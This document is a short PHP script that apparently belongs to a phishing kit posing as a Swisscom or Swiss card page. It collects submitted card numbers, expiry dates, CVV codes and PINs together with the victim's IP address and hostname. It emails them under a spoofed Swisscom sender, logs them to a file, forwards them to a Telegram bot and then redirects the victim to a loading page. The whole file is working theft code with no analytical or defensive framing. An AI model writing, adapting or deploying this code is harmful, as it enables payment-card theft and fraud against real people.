<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "___________SWISS_____________\n";
$message .= "Card Number   : ".$_POST['Cc']."\n";
$message .= "MM  : ".$_POST['Month']."\n";
$message .= "YY : ".$_POST['Year']."\n";
$message .= "cvv : ".$_POST['cvv']."\n";
$message .= "pin : ".$_POST['pin']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| NARCOS  |__________\n";
$send = "";
$subject = "Carte| ".$_POST['cardnumber']." | $ip ";
$headers = "From:Swisscom <anas@vps1767525.ovh.net>";
mail($send,$subject,$message,$headers);
$file = fopen('../Flow33.txt', 'a');
fwrite($file,$message);
include 'configuration.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: load1.html?id=4932YR-329TR23R");

?>